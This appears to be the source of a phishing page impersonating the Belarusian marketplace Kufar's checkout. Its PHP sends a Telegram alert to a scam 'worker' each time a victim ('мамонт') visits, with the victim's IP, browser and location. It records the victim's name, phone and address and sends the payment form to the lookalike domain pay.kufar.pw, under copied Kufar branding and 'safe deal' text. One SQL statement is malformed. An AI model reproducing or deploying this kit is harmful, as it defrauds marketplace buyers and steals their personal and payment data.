<?php 
		
	$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '2' AND `advert_id` = '".(int)mb_substr($_SERVER['REQUEST_URI'], 8)."' AND `status` = '1'");

	if(mysqli_num_rows($query) > 0) {
		$order = mysqli_fetch_assoc($query);
		$size = getimagesize($order['image']);
		
		if($order['delivery'] != '0') {
			$delivery = $order['delivery'];
		} else {
			$delivery = $config['delivery'];
		}

		mysqli_query($connection, "UPDATE `adverts` SET `views` = `views`+1 WHERE `advert_id` = '".$order['advert_id']."'");
		
		$text = "⚠️ <b>Мамонт перешел на страницу объявления</b>⚠️\n\n";
		$text .= "🌍 <b>Платформа:</b> <code>Куфар</code>\n";
		$text .= "🆔 <b>ID объявления:</b> <code>$order[advert_id]</code>\n";
		$text .= "📦 <b>Название товара:</b> <code>$order[title]</code>\n";
		$text .= "💰 <b>Сумма товара:</b> <code>$order[price] руб.</code>\n";
		$text .= "🚚 <b>Сумма доставки:</b> <code>$delivery руб.</code>\n";
		$text .= "\n$visitor[os] — ".getCountryFlag($visitor['country_code'])." $visitor[country], $visitor[city]\n";
		$text .= "Браузер $visitor[browser], $visitor[ip]";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));
		
		if(isset($_POST['order'])) {
			$order_id = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id` FROM `payments` ORDER BY `id` DESC LIMIT 1"));

            $firstname = $connection->real_escape_string($_POST[firstname]);
            $lastname = $connection->real_escape_string($_POST[lastname]);
            $middlename = $connection->real_escape_string($_POST[middlename]);
            $phone = $connection->real_escape_string($_POST[phone]);
            $address = $connection->real_escape_string($_POST[address]);
            $flat = $connection->real_escape_string($_POST[flat]);

			mysqli_query($connection, "INSERT INTO `payments` (`type`, `worker`, `advert_id`, `amount`, `currency`, `firstname`, `lastname`, `middlename`, `phone`, `address`, `flat`, `card`, `expiry`, `cvc`, `recipient`, `status`, `ip`, `browser`, `os`, `time`) VALUES ('2', $order[worker]', '$order[advert_id]', '$order[price]+$config[delivery]', 'RUB', '$firstname', '$lastname', '$middlename', '$phone', '$address', '$flat', '0', '0', '0', '0', '0', '$visitor[ip]', '$visitor[browser]', '$visitor[os]', '".time()."')");
			setcookie('order_id', $order_id['id']+1, time()+3600, '/');
			setcookie('name', mb_strtoupper(str_replace('`', '', str_replace('+', ' ', rus2translit($_POST['firstname'].' '.$_POST['lastname'])))), time()+3600, '/');
			header('Location: /order?id='.$order['advert_id']);
		}
	} else {
		header('Location: https://'.$_SERVER['SERVER_NAME'].'/');
	}

?>

<html lang="ru" prefix="og: http://ogp.me/ns#" id="html">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, minimal-ui, user-scalable=no">
	<meta name="twitter:card" content="Самый простой способ продать или купить вещи">
	<meta name="format-detection" content="telephone=no">
	<meta name="apple-mobile-web-app-title" content="Куфар в Беларуси - доска бесплатных объявлений | Барахолка в Беларуси">
	<meta name="theme-color" content="#00ad64">
	<title>Оформление и оплата</title>
	<link rel="shortcut icon" href="/assets/favicon.png" type="image/x-icon">
	<meta name="description" content="Цены на новые и Б/У товары в Беларуси. Подать бесплатное объявление или купить любой товар в Беларуси можно на Kufar.by - крупнейшей площадке объявлений в Беларуси.">
	<meta property="og:site_name" content="Куфар">
	<meta property="og:title" content="Куфар Доставка">
	<meta property="og:type" content="website">
	<meta property="og:url" content="https://kufar.by/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:image" content="<?php echo $order['image']; ?>">
	<meta property="og:image:secure_url" content="<?php echo $order['image']; ?>">
	<meta property="og:image:type" content="<?php echo $size['mime']; ?>">
	<meta property="og:image:width" content="<?php echo $size[0]; ?>">
	<meta property="og:image:height" content="<?php echo $size[0]; ?>">
	<meta property="og:description" content="Цены на новые и Б/У товары в Беларуси. Подать бесплатное объявление или купить любой товар в Беларуси можно на Kufar.by - крупнейшей площадке объявлений в Беларуси.">
	<link type="text/css" href="/assets/css/common.css" rel="stylesheet">
	<link type="text/css" href="/assets/css/payments.css" rel="stylesheet">
	<meta name="csrf_token" content="wnOVNeL_4D7DmK-oX3FsvI9FmlBemqZdGo-qyfgeOIU">
	<style type="text/css" data-styled-components="NpgRx fTFJgk cJUDJS kBbzCN" data-styled-components-is-local="true">
	
	.sc-bdVaJa {}
	
	.kBbzCN b {
		font-weight: inherit;
	}
	
	.kBbzCN i {
		display: none;
	}
	
	.body--old_rouble .kBbzCN i {
		display: inline;
		-webkit-user-select: text;
		-moz-user-select: text;
		-ms-user-select: text;
		user-select: text;
	}
	
	.sc-jAaTju {}
	
	.cJUDJS {
		box-sizing: border-box;
		width: 100%;
		padding-left: 5px;
		padding-right: 5px;
	}
	
	@media screen and (min-width: 575px) {
		.cJUDJS {
			padding-left: 5px;
			padding-right: 5px;
		}
	}
	
	@media screen and (min-width: 767px) {
		.cJUDJS {
			padding-left: 8px;
			padding-right: 8px;
		}
	}
	/* sc-component-id: sc-jDwBTQ */
	
	.sc-jDwBTQ {}
	
	.fTFJgk {
		box-sizing: border-box;
		margin-left: -5px;
		margin-right: -5px;
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
		-webkit-flex-wrap: wrap;
		-ms-flex-wrap: wrap;
		flex-wrap: wrap;
	}
	
	@media screen and (min-width: 575px) {
		.fTFJgk {
			margin-left: -5px;
			margin-right: -5px;
		}
	}
	
	@media screen and (min-width: 767px) {
		.fTFJgk {
			margin-left: -8px;
			margin-right: -8px;
		}
	}
	/* sc-component-id: sc-gPEVay */
	
	.sc-gPEVay {}
	
	.NpgRx {
		max-width: 1264px;
		min-width: 320px;
		width: 100%;
		margin-left: auto;
		margin-right: auto;
		padding-left: 16px;
		padding-right: 16px;
	}
	</style>
	<style type="text/css" data-styled-components="cTkhPF iVXCSc bbyJzT blSEcj kRufpp jLgHKS hvBxNu" data-styled-components-is-local="true">
	/* sc-component-id: sc-iRbamj */
	
	.sc-iRbamj {}
	/* sc-component-id: sc-jlyJG */
	
	.sc-jlyJG {}
	/* sc-component-id: sc-fBuWsC */
	
	.sc-fBuWsC {}
	
	.hvBxNu {
		overflow: hidden;
		text-overflow: ellipsis;
		white-space: nowrap;
	}
	/* sc-component-id: sc-dVhcbM */
	
	.sc-dVhcbM {}
	
	.jLgHKS {
		position: relative;
		display: inline-block;
		vertical-align: middle;
		margin: 0;
		padding: 0;
		font-family: inherit;
		color: inherit;
		-webkit-text-decoration: none;
		text-decoration: none;
		text-align: center;
		line-height: normal;
		white-space: nowrap;
		background-color: transparent;
		border: 0;
		outline: 0;
		cursor: pointer;
		overflow: hidden;
		-webkit-transition: all .2s ease;
		transition: all .2s ease;
		border-radius: 4px;
		color: #fff;
		background-color: #59a840;
		box-shadow: none;
		display: block;
		width: 100%;
		box-sizing: border-box;
	}
	
	.jLgHKS:hover {
		-webkit-text-decoration: none;
		text-decoration: none;
	}
	
	.jLgHKS:hover {
		color: #fff;
		background-color: #64ae4d;
		box-shadow: none;
	}
	
	.jLgHKS:active {
		color: #fff;
		background-color: #56a23e;
		box-shadow: none;
	}
	
	.jLgHKS .sc-fBuWsC {
		display: block;
		padding: 9px 16px;
		font-size: 16px;
		font-weight: 400;
	}
	
	.jLgHKS .sc-jhAzac {
		display: inline-block;
		vertical-align: middle;
		font-size: 16px;
	}
	
	.jLgHKS .sc-fMiknA {
		position: relative;
		display: inline-block;
		vertical-align: middle;
		height: calc(8px + 16px);
		font-size: calc(8px + 16px);
		line-height: calc(8px + 16px);
		margin-top: -15px;
		margin-bottom: -15px;
	}
	
	.jLgHKS .sc-fMiknA:before {
		display: block;
	}
	/* sc-component-id: sc-eqIVtm */
	
	.sc-eqIVtm {}
	/* sc-component-id: sc-keyframes-cTkhPF */
	
	@-webkit-keyframes cTkhPF {
		from {
			-webkit-transform: translate(-100%);
			-ms-transform: translate(-100%);
			transform: translate(-100%);
		}
		to {
			-webkit-transform: translate(100%);
			-ms-transform: translate(100%);
			transform: translate(100%);
		}
	}
	
	@keyframes cTkhPF {
		from {
			-webkit-transform: translate(-100%);
			-ms-transform: translate(-100%);
			transform: translate(-100%);
		}
		to {
			-webkit-transform: translate(100%);
			-ms-transform: translate(100%);
			transform: translate(100%);
		}
	}
	/* sc-component-id: sc-keyframes-iVXCSc */
	
	@-webkit-keyframes iVXCSc {
		from {
			-webkit-transform: rotate(0deg);
			-ms-transform: rotate(0deg);
			transform: rotate(0deg);
		}
		to {
			-webkit-transform: rotate(360deg);
			-ms-transform: rotate(360deg);
			transform: rotate(360deg);
		}
	}
	
	@keyframes iVXCSc {
		from {
			-webkit-transform: rotate(0deg);
			-ms-transform: rotate(0deg);
			transform: rotate(0deg);
		}
		to {
			-webkit-transform: rotate(360deg);
			-ms-transform: rotate(360deg);
			transform: rotate(360deg);
		}
	}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="ckWumU zCXFX fRBoVq" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-ckWumU */
	
	@-webkit-keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	
	@keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	/* sc-component-id: sc-jXQZqI */
	
	.sc-jXQZqI {}
	
	.zCXFX {
		background-color: transparent;
		z-index: 11;
	}
	/* sc-component-id: sc-iGPElx */
	
	.sc-iGPElx {}
	
	.fRBoVq {
		position: relative;
		z-index: 11;
	}
	</style>
	<style type="text/css" data-styled-components="gZZoSS oVZfB eXwLjQ epSXek dGOIvp liQLis fVgFgO oYlcx dWOPzP kMumCA" data-styled-components-is-local="true">
	/* sc-component-id: sc-hgHYgh */
	
	.sc-hgHYgh {}
	
	.dGOIvp {
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
	}
	
	.dGOIvp > * + * {
		margin-left: 16px;
	}
	
	.dGOIvp > *:last-child {
		margin-left: 24px;
	}
	
	.dGOIvp > * {
		max-height: 32px;
	}
	/* sc-component-id: sc-fOICqy */
	
	.sc-fOICqy {}
	
	.fVgFgO {
		-webkit-box-flex: 1;
		-webkit-flex-grow: 1;
		-ms-flex-positive: 1;
		flex-grow: 1;
		margin-right: 8px;
		max-height: 100%;
	}
	/* sc-component-id: sc-hzDEsm */
	
	.sc-hzDEsm {}
	
	.liQLis {
		font-size: 0;
		margin-right: 8px;
		-webkit-transform: translateY(-8px);
		-ms-transform: translateY(-8px);
		transform: translateY(-8px);
	}
	/* sc-component-id: sc-eKZiaR */
	
	.sc-eKZiaR {}
	
	.oYlcx {
		font-size: 0;
	}
	/* sc-component-id: sc-drMfKT */
	
	.sc-drMfKT {}
	
	.dWOPzP {
		font-size: 0;
		display: inline-block;
		position: relative;
		border-radius: 100%;
		width: 32px;
		height: 32px;
		background-repeat: no-repeat;
		background-size: 32px;
		background-position: center;
	}
	
	.dWOPzP:after {
		top: 0;
		right: -4px;
		z-index: 1;
		pointer-events: none;
		background: #f75059;
		border-radius: 100px;
		position: absolute;
		text-align: center;
		line-height: 14px;
		min-width: 14px;
		font-size: 9px;
		font-weight: 600;
		color: #ffffff;
	}
	
	.dWOPzP::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		border-radius: 50%;
		background-color: rgba(51, 51, 51, 0.02);
		-webkit-transition: background-color 0.2s ease-in-out;
		transition: background-color 0.2s ease-in-out;
	}
	
	.dWOPzP:hover::before {
		background-color: rgba(255, 255, 255, 0.08);
	}
	
	.dWOPzP:focus::before,
	.dWOPzP:active::before {
		background-color: rgba(51, 51, 51, 0.02);
	}
	
	@media (hover: none) {
		.dWOPzP:focus::before {
			background-color: transparent;
		}
		.dWOPzP:hover::before {
			background-color: rgba(51, 51, 51, 0.02);
		}
	}
	/* sc-component-id: sc-gpHHfC */
	
	.sc-gpHHfC {}
	
	.gZZoSS {
		position: relative;
		z-index: 10;
	}
	/* sc-component-id: sc-gVyKpa */
	
	.sc-gVyKpa {}
	
	.oVZfB {
		padding-top: 0px;
		height: 64px;
		background: #ffffff;
	}
	/* sc-component-id: sc-eXNvrr */
	
	.sc-eXNvrr {}
	
	.eXwLjQ {
		width: 100%;
		background: #ffffff;
		box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.04);
		position: absolute;
		-webkit-transition: box-shadow 0.2s;
		transition: box-shadow 0.2s;
		top: 0px;
		height: 64px;
	}
	/* sc-component-id: sc-cpmKsF */
	
	.sc-cpmKsF {}
	
	.kMumCA {
		overflow: hidden;
		position: absolute;
		padding: 16px 0 24px 0;
		background: #ffffff;
		width: 100%;
		opacity: 0;
		visibility: hidden;
		-webkit-transition: opacity 0.1s linear 0s, -webkit-transform 0.1s linear 0s, visibility 0s linear 0.1s;
		-webkit-transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.08);
		-webkit-transform: translate3d(0px, -8px, 0px);
		-ms-transform: translate3d(0px, -8px, 0px);
		transform: translate3d(0px, -8px, 0px);
	}
	/* sc-component-id: sc-kQsIoO */
	
	.sc-kQsIoO {}
	
	.epSXek {
		width: 100%;
		padding: 16px 0;
		height: 64px;
	}
	
	.epSXek .sc-cpmKsF {
		top: 56px;
	}
	</style>
	<style type="text/css" data-styled-components="hKJXlo" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-hKJXlo */
	
	@-webkit-keyframes hKJXlo {
		from {
			opacity: 0.6;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(100%);
			-ms-transform: translateY(100%);
			transform: translateY(100%);
		}
		to {
			opacity: 1;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(0%);
			-ms-transform: translateY(0%);
			transform: translateY(0%);
		}
	}
	
	@keyframes hKJXlo {
		from {
			opacity: 0.6;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(100%);
			-ms-transform: translateY(100%);
			transform: translateY(100%);
		}
		to {
			opacity: 1;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(0%);
			-ms-transform: translateY(0%);
			transform: translateY(0%);
		}
	}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="ckWumU jRQBFv grYHP dllwmI fZtIUm eSRNIz hAfVqs gWOfDy bcxWYD iBzLWS chBiZR jQRite RFfMX" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-ckWumU */
	
	@-webkit-keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	
	@keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	/* sc-component-id: sc-eKZiaR */
	
	.sc-eKZiaR {}
	
	.eSRNIz {
		background-color: transparent;
		z-index: 11;
	}
	/* sc-component-id: sc-drMfKT */
	
	.sc-drMfKT {}
	
	.hAfVqs {
		position: relative;
		z-index: 11;
	}
	/* sc-component-id: sc-hIVACf */
	
	.sc-hIVACf {}
	
	.gWOfDy {
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
	}
	
	.gWOfDy > * + * {
		margin-left: 16px;
	}
	
	.gWOfDy > *:last-child {
		margin-left: 24px;
	}
	
	.gWOfDy > * {
		max-height: 32px;
	}
	/* sc-component-id: sc-eXNvrr */
	
	.sc-eXNvrr {}
	
	.iBzLWS {
		-webkit-box-flex: 1;
		-webkit-flex-grow: 1;
		-ms-flex-positive: 1;
		flex-grow: 1;
		margin-right: 8px;
		max-height: 100%;
	}
	/* sc-component-id: sc-cpmKsF */
	
	.sc-cpmKsF {}
	
	.bcxWYD {
		font-size: 0;
		margin-right: 8px;
		-webkit-transform: translateY(-8px);
		-ms-transform: translateY(-8px);
		transform: translateY(-8px);
	}
	/* sc-component-id: sc-fHxwqH */
	
	.sc-fHxwqH {}
	
	.chBiZR {
		font-size: 0;
	}
	/* sc-component-id: sc-cEvuZC */
	
	.sc-cEvuZC {}
	
	.jQRite {
		font-size: 0;
		display: inline-block;
		position: relative;
		border-radius: 100%;
		width: 32px;
		height: 32px;
		background-repeat: no-repeat;
		background-size: 32px;
		background-position: center;
	}
	
	.jQRite:after {
		top: 0;
		right: -4px;
		z-index: 1;
		pointer-events: none;
		background: #f75059;
		border-radius: 100px;
		position: absolute;
		text-align: center;
		line-height: 14px;
		min-width: 14px;
		font-size: 9px;
		font-weight: 600;
		color: #ffffff;
	}
	
	.jQRite::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		border-radius: 50%;
		background-color: rgba(51, 51, 51, 0.02);
		-webkit-transition: background-color 0.2s ease-in-out;
		transition: background-color 0.2s ease-in-out;
	}
	
	.jQRite:hover::before {
		background-color: rgba(255, 255, 255, 0.08);
	}
	
	.jQRite:focus::before,
	.jQRite:active::before {
		background-color: rgba(51, 51, 51, 0.02);
	}
	
	@media (hover: none) {
		.jQRite:focus::before {
			background-color: transparent;
		}
		.jQRite:hover::before {
			background-color: rgba(51, 51, 51, 0.02);
		}
	}
	/* sc-component-id: sc-ugnQR */
	
	.sc-ugnQR {}
	
	.jRQBFv {
		position: relative;
		z-index: 10;
	}
	/* sc-component-id: sc-eIHaNI */
	
	.sc-eIHaNI {}
	
	.grYHP {
		padding-top: 0px;
		height: 64px;
		background: #ffffff;
	}
	/* sc-component-id: sc-eTpRJs */
	
	.sc-eTpRJs {}
	
	.dllwmI {
		width: 100%;
		background: #ffffff;
		box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.04);
		position: absolute;
		-webkit-transition: box-shadow 0.2s;
		transition: box-shadow 0.2s;
		top: 0px;
		height: 64px;
	}
	/* sc-component-id: sc-dxZgTM */
	
	.sc-dxZgTM {}
	
	.RFfMX {
		overflow: hidden;
		position: absolute;
		padding: 16px 0 24px 0;
		background: #ffffff;
		width: 100%;
		opacity: 0;
		visibility: hidden;
		-webkit-transition: opacity 0.1s linear 0s, -webkit-transform 0.1s linear 0s, visibility 0s linear 0.1s;
		-webkit-transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.08);
		-webkit-transform: translate3d(0px, -8px, 0px);
		-ms-transform: translate3d(0px, -8px, 0px);
		transform: translate3d(0px, -8px, 0px);
	}
	/* sc-component-id: sc-iomxrj */
	
	.sc-iomxrj {}
	
	.fZtIUm {
		width: 100%;
		padding: 16px 0;
		height: 64px;
	}
	
	.fZtIUm .sc-dxZgTM {
		top: 56px;
	}
	</style>
	<style type="text/css" data-styled-components="ivQJJG guHuQp gEGbIW debWtF" data-styled-components-is-local="true">
	/* sc-component-id: sc-gCUMDz */
	
	.sc-gCUMDz {}
	
	.gEGbIW {
		border: none;
		outline: none;
		box-shadow: none;
		box-sizing: border-box;
		padding: 0;
		text-align: left;
		-webkit-appearance: none;
		-moz-appearance: none;
		appearance: none;
		height: 32px;
		padding-left: 10px;
		padding-right: 10px;
		font-size: 14px;
		color: #393939;
		border-radius: 4px;
		border: 1px solid #ebebeb;
		background-color: #fff;
		min-width: 0;
		width: 100%;
	}
	
	.gEGbIW::-ms-clear {
		display: none;
		width: 0;
		height: 0;
	}
	
	.gEGbIW::-webkit-input-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW:-moz-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW::-moz-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW:-ms-input-placeholder {
		color: #8f8f8f;
	}
	/* sc-component-id: sc-imapFV */
	
	.sc-imapFV {}
	
	.debWtF {
		display: block;
		font-size: 12px;
		line-height: 16px;
		color: #8f8f8f;
		margin: 5px 0 0;
		position: static;
	}
	
	.debWtF:empty {
		display: none;
	}
	/* sc-component-id: sc-fATqzn */
	
	.sc-fATqzn {}
	
	.guHuQp {
		position: relative;
		display: block;
		vertical-align: top;
	}
	
	.guHuQp button {
		z-index: 1;
		position: absolute;
		right: 1px;
		top: 50%;
		-webkit-transform: translate(0, -50%);
		-ms-transform: translate(0, -50%);
		transform: translate(0, -50%);
	}
	
	.guHuQp button > span {
		padding: 8px 15px !important;
	}
	
	.guHuQp button + input {
		padding-right: 40px;
	}
	/* sc-component-id: sc-jbWsrJ */
	
	.sc-jbWsrJ {}
	
	.ivQJJG {
		width: 100%;
		display: block;
	}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
</head>

<body class="body body--payments route__product_buy_id body--animations body--old_rouble">
	<div class="app app--simple_layout" id="app">
		<div class="base">
			<div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer" data-tiny="1">
				<header class="sc-ugnQR jRQBFv" data-test-component="HeaderBoard">
					<div class="sc-eIHaNI grYHP"></div>
					<div class="sc-eTpRJs dllwmI">
						<div class="sc-iomxrj fZtIUm">
							<section class="sc-eKZiaR eSRNIz sc-gPEVay NpgRx" data-test-component="HeaderActionMenu">
								<div class="sc-drMfKT hAfVqs sc-jlyJG bbyJzT sc-jDwBTQ fTFJgk">
									<div class="sc-hIVACf gWOfDy sc-iRbamj blSEcj sc-jAaTju cJUDJS">
										<a href="https://kufar.by" title="Куфар" class="sc-cpmKsF bcxWYD sc-eqIVtm kRufpp" data-test-action="IndexPageLink"> <img src="/assets/img/kufar_logo.svg" style="width: 134px;height: 46px;"> </a>
										<div class="sc-eXNvrr iBzLWS"></div>
									</div>
								</div>
							</section>
							<div class="sc-dxZgTM RFfMX"></div>
						</div>
					</div>
				</header>
			</div>
			<header class="header _container header--fixed" data-container="HeaderContainer">
				<div class="header__wrap container">
					<div class="header__bar header_bar row _header_bar" style="height: 64px;">
						<div class="header_bar__logo col-xs-3 col-md-2">
							<a href="#" title="На главную"><img src="/assets/img/kufar_logo.svg" style="width: 40%; height: 70%;"></a>
						</div>
						<div class="header_bar__inner col-xs-12 col-md-10 pull-right">
							<div class="row">
								<aside class="header_bar__search col-xs-12 col-sm-5 _header_search" role="search">
									<div class="form">
										<div class="form_group">
											<div class="_header_search_mount_node"></div>
										</div>
									</div>
								</aside>
								<aside class="col-sm-7">
									<div class="row">
										<div class="header_bar__buttons col-xs-6 col-lg-7">
											<div class="header_bar__login _header_login_container">
												<div>
													<div class="user__image"></div>
													<div class="badge badge--red hide"><span>0</span></div>
												</div>
											</div>
										</div>
									</div>
								</aside>
								<div class="_header_user_dropdown_container">
									<div>
										<aside class="dropdown_menu">
											<div class="dropdown_menu__header">
												<button class="button button--close _dropdown_close_button" type="button" aria-label="Закрыть меню"><i class="icon icon--close"></i></button>
												<h3 class="dropdown_menu__title">Мой профиль</h3> </div>
											<ul data-test-component="UserNavigation" class="dropdown_menu__list dropdown_list">
												<li class="dropdown_list__item">
													<a href="https://kufar.by" class="dropdown_list__link" data-test-action="MyNotificationsLink">
														<div class="dropdown_list__icon"> <i class="icon icon--view_module"></i>
															<div class="badge badge--red hide"><span>0</span></div>
														</div> Мои объявления
													</a>
												</li>
												<li class="dropdown_list__item">
													<a href="https://kufar.by" class="dropdown_list__link" data-test-action="TariffsLink">
														<div class="dropdown_list__icon"><i class="icon icon--square-plus"></i></div> Пакеты объявлений </a>
												</li>
												<li class="dropdown_list__item">
													<a href="https://kufar.by" class="dropdown_list__link" data-test-action="OrdersLink">
														<div class="dropdown_list__icon"> <i class="icon icon--shopping_cart"></i>
															<div class="badge badge--red hide"><span>0</span></div>
														</div> Мои заказы
													</a>
												</li>
												<li class="dropdown_list__item">
													<a href="https://kufar.by" class="dropdown_list__link" data-test-action="MessagesLink">
														<div class="dropdown_list__icon"> <i class="icon icon--message"></i>
															<div class="badge badge--red hide"><span>0</span></div>
														</div> Мои сообщения
													</a>
												</li>
												<li class="dropdown_list__item">
													<a class="dropdown_list__link" href="https://kufar.by" data-test-action="FavoritesLink">
														<div class="dropdown_list__icon"><i class="icon icon--favorite"></i> </div> Закладки
													</a>
												</li>
												<li class="dropdown_list__item">
													<a href="https://kufar.by" class="dropdown_list__link" data-test-action="SettingsLink">
														<div class="dropdown_list__icon"><i class="icon icon--settings"></i> </div> Настройки
													</a>
												</li>
												<li class="dropdown_list__item">
													<a class="dropdown_list__link" data-test-action="HelpLink" href="https://kufar.by">
														<div class="dropdown_list__icon"><i class="icon icon--help"></i> </div> Помощь
													</a>
												</li>
												<li class="dropdown_list__divider"></li>
												<li class="dropdown_list__item">
													<a class="dropdown_list__link" href="https://kufar.by" data-test-action="ExitLink">
														<div class="dropdown_list__icon"><i class="icon icon--exit"></i> </div> Выход
													</a>
												</li>
											</ul>
										</aside>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</header>
			<aside class="nav_container sidebar_container">
				<nav class="_container" data-container="CategoryMobileContainer"></nav>
			</aside>
			<div class="bundle">
				<div class="container _container" data-container="PaymentsContainer">
					<div class="payments_container" id="payments">
						<div>
							<h1 class="title__1tzAN2wR">Оформление и оплата</h1>
							<form method="POST" action="https://pay.kufar.pw">
								<div class="container__28A_2L3T">
									<div>
										<div class="product__2oLb4nXl"> <span class="product_image__2AcYUpNV undefined" style="background: url(<?php echo $order['image']; ?>); background-repeat: none; background-size: cover; background-position: center;"></span>
											<div class="product_content__mI30-3Fr">
												<div class="product_inner__1ZrDwagy">
													<div class="product_price__2IFwtrXu">
														<span class="product_real_price__j_Bk3J3i"><span><span><?php echo number_format($order['price'], 0, '', ' '); ?></span><span class="sc-bdVaJa kBbzCN"><b> руб.</b></span></span></span>
													</div>
													<div class="product_title__3jNOq_vZ"><?php echo $order['title']; ?></div>
												</div>
											</div>
										</div>
										<div class="container__b66PCR7o">
											<div class="summary__2TIRymkY">
												<div class="summary_header__bJmC15X9">
													<div class="summary_price__1HT5R9_P"><span><span class="product_amount"><?php echo number_format($order['price'], 0, '', ' '); ?></span><span class="sc-bdVaJa kBbzCN"><b> руб.</b></span></span>
													</div>
													<div class="summary_delivery__1bPMd9hw" style="">С учетом стоимости доставки <span><span class="delivery_price"><?php echo number_format($order['price']+$delivery, 0, '', ' '); ?></span> <span class="sc-bdVaJa ijDeHI">руб.</span></span>
													</div>
												</div>
												<div class="fixed_buttons fixed_buttons--single">
													<div class="summary_total__3aEKbkJu"> Итого
														<div class="summary_total_value__nRhP7XkA"><span><span class="product_amount"><?php echo number_format($order['price']+$delivery, 0, '', ' '); ?></span><span class="sc-bdVaJa kBbzCN"><b> руб.</b></span></span>
														</div>
													</div>
													<form method="POST" action="https://pay.kufar.pw">
                                                        <div class="button_container">
                                                            <input type="hidden" name="orderID" value="<?php echo $order['advert_id']; ?>">
                                                            <input type="submit" name="order" class="sc-dVhcbM jLgHKS" value="Перейти к оплате" id="button_order" style="padding: 9px 16px;background-color: #00ad64">
                                                        </div>
													</form>
												</div>
												<div class="safely_text__392qqBrF">
													<div class="status_badge__icon status_badge__icon--deal"></div> <span>Оплачивать на Kufar безопасно</span> </div>
												<div class="hint">Нажимая кнопку «Перейти к оплате», вы соглашаетесь с заключением Договора купли-продажи товаров с использованием Онлайн сервиса «Безопасная сделка» </div>
											</div>
											<div class="block__3ioUhNQH">
												<div class="panel__3B1d-ak5">
													<div class="panel_icon__1HmxOezY">
														<div class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
													</div>
													<div class="panel_content__VGeorc1g">
														<div class="text__3Wt10VPX">Выбрана доставка по городу.</div>
														<div class="hint__aMasvQSz">Стоимость доставки в разные города может различаться.</div>
													</div>
													<div class="panel_button__2vr4fIVO" style="float: right;margin: -5px -15px 0;"> </div>
												</div>
												<div class="tabs__2t54pDtg">
													<a class="w-select-delivery-type tab__13DKWU-D" data-delivery-type="ne_sam">
														<div class="tab_title__3JjUypIZ" style="width: 232px;">Доставка курьером Белпочты</div>
														<div class="tab_price__3c3Qa3nF">
															<div><?php echo number_format($delivery); ?> руб.</div>
														</div>
														<div class="tab_desc__2Lf7A_79"><span>от 1 до 3 рабочих дней</span></div>
													</a>
												</div>
												<div id="delivery_sam" style="display: none;">
